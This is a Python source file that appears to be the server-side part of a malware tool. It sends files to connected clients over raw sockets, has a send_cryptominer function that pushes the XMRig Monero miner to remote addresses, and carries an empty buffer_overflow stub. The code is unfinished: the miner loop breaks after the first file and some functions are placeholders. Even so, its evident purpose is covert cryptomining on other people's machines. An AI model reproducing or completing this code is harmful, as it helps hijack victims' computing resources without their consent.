import tqdm
import time
import os
import multiprocessing as mp
import tools


def receive_file(buffer_size,client, address,separator="<SEPARATOR>"):

    print(f"[{address}] Receiving file..")
     
    file_data = client.recv(buffer_size).decode()
    #ADD TRY CATCH 
    filename,file_size = file_data.split(separator)
    #print(file_data)
    # remove absolute path if there is
    filename = os.path.basename(filename)
    file_size = int(file_size)

    progress = tqdm.tqdm(
        range(file_size),
        f"Receiving {filename}", 
        unit="B", 
        unit_scale=True, 
        unit_divisor=1024)
    
    #WRITE BYTES IN FILE
    with open(filename,'wb') as file: 
        while True: 
            bytes_read = client.recv(buffer_size)
            if not bytes_read:
                break
            
            file.write(bytes_read)
            progress.update(len(bytes_read))


def send_file(filename,buffer_size,connection,separator="<SEPARATOR>"):
    
    tools.send_data(connection,"UWU",'receive_file')
    time.sleep(2)
    print(f"[+] Sending '{filename}'") 
    file_size = os.path.getsize(filename)
    
    #SEND FILE DATA
    connection.send(f"{filename}{separator}{file_size}".encode())

    progress = tqdm.tqdm(
        range(file_size),
        f"Sending {filename}", 
        unit="B", 
        unit_scale=True, 
        unit_divisor=1024)
    
    with open(filename, "rb") as file:
        while True:
            bytes_read = file.read(buffer_size)
            if not bytes_read:
                break
            connection.sendall(bytes_read)
            progress.update(len(bytes_read))


def receive_dir():
    pass


def send_cryptominer (buffer_size,connection,address):
    #SEND ALL THE CRYPTOMINER'S FILES
    print(f"[SERVER] Sending cryptominer to {address}")
    current_path = os.getcwd()
    cryptominer_path = f"{current_path}/xmrig-6.18.0"
    os.chdir(cryptominer_path)

    for file in os.listdir(cryptominer_path): 
        send_file(file, buffer_size, connection)
        break
        time.sleep(2)

    os.chdir(current_path)


def buffer_overflow(): 
    
    return
